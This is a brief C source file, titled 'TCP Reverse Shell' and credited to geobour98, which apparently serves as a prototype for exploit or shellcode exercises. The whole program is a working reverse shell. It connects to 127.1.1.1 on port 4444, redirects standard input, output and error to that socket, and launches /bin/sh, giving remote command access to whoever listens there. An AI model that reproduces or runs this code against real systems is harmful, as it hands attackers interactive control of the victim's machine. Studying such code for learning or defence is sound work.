// TCP Reverse Shell
// Author: geobour98

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>

int main()
{
	
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in address = {
		.sin_family = AF_INET,
		.sin_port = htons(4444),
		.sin_addr = inet_addr("127.1.1.1")
	};

	connect(sockfd, (struct sockaddr*) &address, sizeof(address));

	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	execve("/bin/sh", NULL, NULL);
	
	return 0;
}
